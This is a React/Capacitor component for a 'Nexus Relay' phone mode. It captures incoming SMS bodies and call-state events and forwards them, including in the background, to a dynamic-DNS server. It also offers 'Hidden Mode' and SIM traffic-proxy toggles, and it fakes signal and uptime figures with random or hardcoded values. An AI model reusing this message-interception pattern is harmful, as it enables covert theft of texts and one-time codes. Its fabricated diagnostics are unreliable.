import React, { useState, useEffect, useRef } from 'react';
import {
  Signal, 
  Wifi, 
  Battery, 
  Activity, 
  History, 
  ShieldCheck, 
  Server, 
  AlertCircle,
  Play,
  Pause,
  Settings,
  RefreshCw,
  Phone,
  MessageSquare
} from 'lucide-react';

const RelayMode = ({ operator, t, onExit, syncPushToken, isSyncingPush, requestRelayPermissions }) => {
  const RELAY_API_BASE = 'https://nexus-api.myvnc.com';
  const [isActive, setIsActive] = useState(true);
  const [connectionStatus, setConnectionStatus] = useState('connecting');
  const [signalStrength, setSignalStrength] = useState(85);
  const [batteryLevel, setBatteryLevel] = useState(100);
  const [isCharging, setIsCharging] = useState(false);
  const [logs, setLogs] = useState([]);
  const [lastForwardedId, setLastForwardedId] = useState(null);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [activeLog, setActiveLog] = useState(null);
  const [showSettings, setShowSettings] = useState(false);
  const [settingsBatteryWarning, setSettingsBatteryWarning] = useState(true);
  const [settingsTrafficProxy, setSettingsTrafficProxy] = useState(true);
  const [settingsHiddenMode, setSettingsHiddenMode] = useState(false);
  const latestHealthCheckRef = useRef(0);

  const connectionUi = {
    connected: {
      label: 'CONNECTED',
      color: 'var(--success-color)',
      icon: Server
    },
    connecting: {
      label: 'CONNECTING',
      color: 'var(--accent-color)',
      icon: RefreshCw
    },
    disconnected: {
      label: 'DISCONNECTED',
      color: 'var(--error-color)',
      icon: AlertCircle
    }
  };

  const currentConnectionUi = connectionUi[connectionStatus] || connectionUi.disconnected;
  const isServerConnected = connectionStatus === 'connected';

  const updateBatteryDiagnostics = async () => {
    try {
      const devicePlugin = window.Capacitor?.Plugins?.Device;
      if (devicePlugin?.getBatteryInfo) {
        const info = await devicePlugin.getBatteryInfo();
        if (typeof info?.batteryLevel === 'number') {
          setBatteryLevel(Math.max(0, Math.min(100, Math.round(info.batteryLevel * 100))));
        }
        if (typeof info?.isCharging === 'boolean') {
          setIsCharging(info.isCharging);
        }
        return;
      }

      if (typeof navigator !== 'undefined' && navigator.getBattery) {
        const battery = await navigator.getBattery();
        setBatteryLevel(Math.max(0, Math.min(100, Math.round((battery.level || 0) * 100))));
        setIsCharging(Boolean(battery.charging));
      }
    } catch (error) {
      console.warn('[Relay] Failed to read battery level', error);
    }
  };

  const refreshDiagnostics = () => {
    setIsRefreshing(true);
    void updateBatteryDiagnostics();
    setTimeout(() => {
      setSignalStrength(prev => Math.max(70, Math.min(100, prev + (Math.random() * 6 - 3))));
      setIsRefreshing(false);
    }, 800);
  };

  useEffect(() => {
    void updateBatteryDiagnostics();
    const interval = setInterval(() => {
      void updateBatteryDiagnostics();
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  const checkServerConnection = async ({ showConnectingState = true } = {}) => {
    const checkId = ++latestHealthCheckRef.current;
    if (showConnectingState) {
      setConnectionStatus('connecting');
    }

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 6000);
      const response = await fetch(`${RELAY_API_BASE}/health`, {
        method: 'GET',
        cache: 'no-store',
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`Health check failed (${response.status})`);
      }

      if (checkId === latestHealthCheckRef.current) {
        setConnectionStatus('connected');
      }
      return true;
    } catch (error) {
      console.warn('[Relay] Server is unreachable', error);
      if (checkId === latestHealthCheckRef.current) {
        setConnectionStatus('disconnected');
      }
      return false;
    }
  };

  const reconnectServer = async () => {
    setIsRefreshing(true);
    const connected = await checkServerConnection();

    if (typeof syncPushToken === 'function') {
      try {
        await syncPushToken();
      } catch (error) {
        console.warn('[Relay] Push token sync failed during reconnect', error);
      }
    }

    setIsRefreshing(false);
    if (!connected) {
      alert('Server is unreachable. Check internet connection and try again.');
    }
  };

  const forwardData = async (type, from, content) => {
    if (!isActive) return;
    
    const newLog = {
      id: Date.now(),
      type,
      from,
      content,
      fullData: content,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      status: 'pending'
    };

    setLogs(prev => [newLog, ...prev.slice(0, 19)]);

    try {
      const response = await fetch(`${RELAY_API_BASE}/api/device/relay`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: operator?.id || 'RELAY-01',
          type,
          from,
          content,
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        setConnectionStatus('connected');
        setLogs(prev => prev.map(l => l.id === newLog.id ? { ...l, status: 'forwarded' } : l));
        setLastForwardedId(newLog.id);
      } else {
        throw new Error('Failed to forward');
      }
    } catch (error) {
      console.error('Relay Error:', error);
      setConnectionStatus('disconnected');
      setLogs(prev => prev.map(l => l.id === newLog.id ? { ...l, status: 'failed' } : l));
    }
  };

  useEffect(() => {
    void checkServerConnection();
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      void checkServerConnection({ showConnectingState: false });
    }, 15000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    // Sync relay status to native side for background forwarding
    if (window.Capacitor?.Plugins?.NexusRelay) {
      window.Capacitor.Plugins.NexusRelay.configureRelay({
        baseUrl: 'https://nexus-api.myvnc.com/api/device/relay',
        deviceId: operator?.id || 'RELAY-01',
        isActive: isActive
      });
    }
  }, [isActive, operator]);

  useEffect(() => {
    if (window.Capacitor?.Plugins?.NexusRelay) {
      const smsListener = window.Capacitor.Plugins.NexusRelay.addListener('onSmsReceived', (data) => {
        forwardData('sms', data.from, data.body);
      });
      const callListener = window.Capacitor.Plugins.NexusRelay.addListener('onCallStateChanged', (data) => {
        forwardData('call', data.from, `State: ${data.state}`);
      });
      return () => {
        smsListener.remove();
        callListener.remove();
      };
    }
  }, [isActive, operator]);

  useEffect(() => {
    if (!isActive || window.Capacitor?.Plugins?.NexusRelay) return;
    const interval = setInterval(() => {
      setSignalStrength(prev => Math.max(70, Math.min(100, prev + (Math.random() * 10 - 5))));
      void updateBatteryDiagnostics();
    }, 10000);
    return () => clearInterval(interval);
  }, [isActive]);

  return (
    <div className="relay-container fade-in" style={{ 
      minHeight: '100vh', 
      background: '#07080a', 
      color: 'white', 
      padding: 'calc(env(safe-area-inset-top, 30px) + 1.5rem) 1.5rem 0',
      paddingBottom: 'calc(env(safe-area-inset-bottom, 0px) + 5.5rem)',
      display: 'flex',
      flexDirection: 'column',
      gap: '1.5rem',
      position: 'relative',
      width: '100%',
      boxSizing: 'border-box'
    }}>
      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
          <div style={{ width: '40px', height: '40px', background: 'var(--accent-color)', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <RefreshCw size={24} className={(connectionStatus === 'connecting' || isRefreshing) ? 'rotate' : ''} />
          </div>
          <div>
            <h2 style={{ fontSize: '1.25rem', fontWeight: '900', letterSpacing: '0.05em' }}>NEXUS RELAY</h2>
            <div style={{ fontSize: '0.7rem', color: 'var(--text-secondary)', fontWeight: '700' }}>DEVICE ID: {operator?.id?.toUpperCase() || 'RELAY-01'}</div>
          </div>
        </div>
        <button 
          onClick={() => setIsActive(!isActive)}
          style={{ 
            width: '50px', 
            height: '50px', 
            borderRadius: '50%', 
            border: 'none', 
            background: isActive ? 'rgba(34, 197, 94, 0.2)' : 'rgba(239, 68, 68, 0.2)',
            color: isActive ? 'var(--success-color)' : 'var(--error-color)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}
        >
          {isActive ? <Pause size={24} fill="currentColor" /> : <Play size={24} fill="currentColor" />}
        </button>
      </div>

      {/* Main Status Cards */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          {[
          { icon: currentConnectionUi.icon, label: 'SERVER', value: currentConnectionUi.label, color: currentConnectionUi.color, isStatus: true },
          { icon: Signal, label: 'SIGNAL', value: `${Math.round(signalStrength)}%`, color: isServerConnected ? 'var(--success-color)' : 'var(--text-secondary)' },
          { icon: Battery, label: 'BATTERY', value: `${Math.round(batteryLevel)}%${isCharging ? ' ⚡' : ''}`, color: batteryLevel > 20 ? (isServerConnected ? 'var(--success-color)' : 'var(--text-secondary)') : 'var(--error-color)' },
          { icon: Activity, label: 'UPTIME', value: '14d 05h', color: isServerConnected ? 'var(--accent-color)' : 'var(--text-secondary)' }
        ].map((card, i) => (
          <div 
            key={i} 
            onClick={card.isStatus ? reconnectServer : refreshDiagnostics}
            className="glass-card clickable"
            style={{ 
              padding: '1.25rem', 
              borderRadius: '20px', 
              background: 'rgba(255,255,255,0.02)', 
              border: '1px solid var(--card-border)',
              cursor: 'pointer',
              transition: 'all 0.2s ease',
              transform: isRefreshing ? 'scale(0.98)' : 'scale(1)'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1rem' }}>
              <card.icon size={18} color={card.color} className={(isRefreshing || (card.isStatus && connectionStatus === 'connecting')) ? 'rotate' : ''} />
              <span style={{ fontSize: '0.75rem', fontWeight: '800', color: 'var(--text-secondary)' }}>{card.label}</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              {card.isStatus && <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: card.color }}></div>}
              <span style={{ fontSize: '1.1rem', fontWeight: '900' }}>{card.value}</span>
            </div>
          </div>
        ))}
      </div>

      {/* Permissions Check */}
      <div 
        onClick={async () => {
          if (typeof requestRelayPermissions !== 'function') {
            alert('Relay permission prompt is unavailable on this platform.');
            return;
          }
          const status = await requestRelayPermissions();
          if (status?.ready) {
            alert('SMS and phone permissions are granted.');
            return;
          }
          alert('Please allow SMS and phone permissions to keep Relay monitoring active.');
        }}
        className="glass-card clickable"
        style={{ padding: '1.5rem', borderRadius: '20px', background: 'rgba(59, 130, 246, 0.05)', border: '1px solid rgba(59, 130, 246, 0.2)', cursor: 'pointer' }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
            <ShieldCheck size={20} color="var(--success-color)" />
            <span style={{ fontWeight: '800' }}>{t('permissionsActive') || 'Permissions Active'}</span>
          </div>
          <AlertCircle size={18} color="var(--text-secondary)" />
        </div>
        <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
          {['SMS_READ', 'SMS_RECEIVE', 'PHONE_STATE', 'BACKGROUND_SYNC'].map(p => (
            <div key={p} style={{ fontSize: '0.6rem', padding: '0.3rem 0.6rem', background: 'rgba(255,255,255,0.05)', borderRadius: '6px', border: '1px solid var(--card-border)', color: 'var(--text-secondary)' }}>{p}</div>
          ))}
        </div>
      </div>

      {/* Forwarding Logs */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
            <History size={20} color="var(--text-secondary)" />
            <h3 style={{ fontSize: '1rem', fontWeight: '800' }}>{t('forwardingLogs') || 'FORWARDING LOGS'}</h3>
          </div>
          <button 
            onClick={() => setLogs([])}
            style={{ padding: '0.4rem 0.85rem', background: 'transparent', border: '1px solid var(--card-border)', borderRadius: '8px', color: 'var(--text-secondary)', fontSize: '0.7rem', fontWeight: '800', cursor: 'pointer' }}
          >
            {t('clear') || 'CLEAR'}
          </button>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
          {logs.map(log => (
            <div 
              key={log.id} 
              onClick={() => setActiveLog(log)}
              className="clickable"
              style={{ 
                padding: '1rem', 
                borderRadius: '16px', 
                background: 'rgba(255,255,255,0.02)', 
                border: '1px solid var(--card-border)',
                display: 'flex',
                gap: '1rem',
                alignItems: 'center',
                cursor: 'pointer'
              }}
            >
              <div style={{ 
                width: '40px', 
                height: '40px', 
                borderRadius: '10px', 
                background: log.type === 'sms' ? 'rgba(59, 130, 246, 0.1)' : 'rgba(34, 197, 94, 0.1)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: log.type === 'sms' ? 'var(--accent-color)' : 'var(--success-color)'
              }}>
                {log.type === 'sms' ? <MessageSquare size={20} /> : <Phone size={20} />}
              </div>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                  <span style={{ fontSize: '0.85rem', fontWeight: '800' }}>{log.from}</span>
                  <span style={{ fontSize: '0.7rem', color: 'var(--text-secondary)' }}>{log.time}</span>
                </div>
                <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', margin: 0, wordBreak: 'break-word', display: '-webkit-box', WebkitLineClamp: 2, WebkitBoxOrient: 'vertical', overflow: 'hidden' }}>
                  {log.content}
                </p>
              </div>
              <div style={{ fontSize: '0.6rem', padding: '0.2rem 0.5rem', background: log.status === 'failed' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(34, 197, 94, 0.1)', color: log.status === 'failed' ? 'var(--error-color)' : 'var(--success-color)', borderRadius: '4px', fontWeight: '800' }}>
                {log.status.toUpperCase()}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Footer Settings */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', marginTop: 'auto', paddingTop: '1rem' }}>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          <button 
            onClick={reconnectServer}
            disabled={isSyncingPush || isRefreshing}
            style={{ padding: '1rem', borderRadius: '14px', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.2)', color: 'var(--accent-color)', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem', cursor: 'pointer' }}>
            <RefreshCw size={18} className={(isSyncingPush || isRefreshing) ? 'rotate' : ''} />
            {(isSyncingPush || isRefreshing) ? 'RECONNECTING...' : 'RECONNECT SERVER'}
          </button>
          <button 
            onClick={() => setShowSettings(true)}
            style={{ padding: '1rem', borderRadius: '14px', background: 'rgba(255,255,255,0.05)', border: '1px solid var(--card-border)', color: 'white', fontWeight: '800', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem', cursor: 'pointer' }}>
            <Settings size={18} /> {t('settings') || 'SETTINGS'}
          </button>
        </div>
        <button 
          onClick={onExit}
          style={{ padding: '1rem', borderRadius: '14px', background: 'rgba(255,255,255,0.05)', border: '1px solid var(--card-border)', color: 'var(--text-secondary)', fontWeight: '800', cursor: 'pointer' }}>
          {t('exitMode') || 'EXIT MODE'}
        </button>
      </div>

      {/* Log Detail Modal */}
      {activeLog && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(8px)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '2rem' }} onClick={() => setActiveLog(null)}>
          <div style={{ background: '#12141a', border: '1px solid var(--card-border)', borderRadius: '24px', width: '100%', maxWidth: '400px', padding: '2rem', boxShadow: '0 20px 50px rgba(0,0,0,0.5)' }} onClick={e => e.stopPropagation()}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '2rem' }}>
              <div style={{ width: '50px', height: '50px', borderRadius: '12px', background: 'rgba(59,130,246,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--accent-color)' }}>
                {activeLog.type === 'sms' ? <MessageSquare size={24} /> : <Phone size={24} />}
              </div>
              <div>
                <div style={{ fontWeight: '900', fontSize: '1.1rem' }}>{activeLog.from}</div>
                <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>{activeLog.time} • Forwarded to Nexus</div>
              </div>
            </div>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '1.5rem', borderRadius: '16px', border: '1px solid var(--card-border)', color: 'var(--text-secondary)', fontSize: '0.95rem', lineHeight: '1.6', marginBottom: '2rem' }}>
              {activeLog.fullData}
            </div>
            <button onClick={() => setActiveLog(null)} style={{ width: '100%', padding: '1rem', borderRadius: '14px', background: 'var(--accent-color)', border: 'none', color: 'white', fontWeight: '900', cursor: 'pointer' }}>CLOSE</button>
          </div>
        </div>
      )}

      {/* Settings Drawer */}
      {showSettings && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(8px)', zIndex: 1000, display: 'flex', alignItems: 'flex-end' }} onClick={() => setShowSettings(false)}>
          <div style={{ background: '#12141a', borderTop: '1px solid var(--card-border)', borderTopLeftRadius: '32px', borderTopRightRadius: '32px', width: '100%', height: '100dvh', padding: '2rem 1.5rem', paddingBottom: 'calc(env(safe-area-inset-bottom, 0px) + 1rem)', boxSizing: 'border-box', display: 'flex', flexDirection: 'column' }} onClick={e => e.stopPropagation()}>
            <div style={{ width: '40px', height: '4px', background: 'rgba(255,255,255,0.1)', borderRadius: '2px', margin: '0 auto 1.5rem' }} />
            <h3 style={{ fontSize: '1.25rem', fontWeight: '900', marginBottom: '1.5rem' }}>Relay Settings</h3>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', flex: 1, overflowY: 'auto' }}>
                {[
                { label: 'API Gateway', sub: `https://nexus-api.myvnc.com/api/device/relay • ${currentConnectionUi.label}`, icon: currentConnectionUi.icon, iconColor: currentConnectionUi.color, toggle: undefined, onToggle: reconnectServer },
                { label: 'Battery Warning', sub: 'Alert at 15%', icon: Battery, toggle: settingsBatteryWarning, onToggle: () => setSettingsBatteryWarning(v => !v) },
                { label: 'Traffic Proxy', sub: 'Routing through SIM', icon: Wifi, toggle: settingsTrafficProxy, onToggle: () => setSettingsTrafficProxy(v => !v) },
                { label: 'Hidden Mode', sub: 'Hide text in logs', icon: Activity, toggle: settingsHiddenMode, onToggle: () => setSettingsHiddenMode(v => !v) }
              ].map((item, i) => (
                <div key={i} onClick={item.onToggle} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0.85rem', background: 'rgba(255,255,255,0.02)', borderRadius: '16px', border: '1px solid var(--card-border)', cursor: item.onToggle ? 'pointer' : 'default' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                    <div style={{ width: '36px', height: '36px', borderRadius: '10px', background: 'rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}><item.icon size={18} color={item.iconColor || 'var(--accent-color)'} className={(item.label === 'API Gateway' && connectionStatus === 'connecting') ? 'rotate' : ''} /></div>
                    <div style={{ minWidth: 0 }}>
                      <div style={{ fontWeight: '800', fontSize: '0.95rem' }}>{item.label}</div>
                      <div style={{ fontSize: '0.7rem', color: 'var(--text-secondary)' }}>{item.sub}</div>
                    </div>
                  </div>
                  {item.toggle !== undefined ? (
                    <div
                      onClick={e => { e.stopPropagation(); item.onToggle(); }}
                      style={{ width: '44px', height: '24px', background: item.toggle ? 'var(--accent-color)' : 'rgba(255,255,255,0.1)', borderRadius: '12px', position: 'relative', cursor: 'pointer', flexShrink: 0 }}
                    >
                      <div style={{ width: '20px', height: '20px', background: 'white', borderRadius: '50%', position: 'absolute', top: '2px', left: item.toggle ? '22px' : '2px', transition: 'all 0.2s ease' }} />
                    </div>
                  ) : <RefreshCw size={16} color="var(--text-secondary)" />}
                </div>
              ))}
            </div>

            <button onClick={() => setShowSettings(false)} style={{ width: '100%', padding: '1rem', borderRadius: '18px', background: 'var(--accent-color)', border: 'none', color: 'white', fontWeight: '900', marginTop: '1rem', cursor: 'pointer', transition: 'all 0.2s ease' }}>SAVE & CLOSE</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default RelayMode;
